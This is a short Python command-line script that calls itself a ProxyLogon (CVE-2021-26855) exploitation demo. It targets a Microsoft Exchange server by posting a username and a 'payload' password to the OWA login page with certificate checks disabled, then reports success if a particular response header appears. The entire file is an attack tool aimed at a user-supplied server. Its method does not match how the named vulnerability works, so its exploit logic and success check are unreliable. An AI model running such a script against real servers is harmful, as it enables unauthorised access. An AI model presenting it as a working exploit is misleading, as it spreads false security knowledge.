import requests
import argparse

# ProxyLogon Vulnerability Checker CLI
# This tool demonstrates using the ProxyLogon vulnerability (CVE-2021-26855) for authentication.
# Created by milosilo

def authenticate_with_proxylogon(target_url, username, payload):
    login_payload = {
        "username": username,
        "password": payload,
    }
    login_url = target_url.rstrip("/") + "/owa/auth.owa"
    
    with requests.Session() as session:
        session.post(login_url, data=login_payload, verify=False)
        response = session.get(login_url + "?bO0aaa=", verify=False)
    
    return response

def main():
    parser = argparse.ArgumentParser(description="ProxyLogon Vulnerability Exploitation Demo CLI")
    parser.add_argument("url", help="Target URL for Microsoft Exchange server")
    parser.add_argument("--username", required=True, help="Username for authentication")
    parser.add_argument("--payload", required=True, help="Payload to exploit ProxyLogon vulnerability")

    args = parser.parse_args()

    response = authenticate_with_proxylogon(args.url, args.username, args.payload)
    if "X-AnonResource" in response.headers:
        print(f"Authenticated with ProxyLogon vulnerability on {args.url}.")
    else:
        print(f"Authentication failed on {args.url}.")

if __name__ == "__main__":
    main()
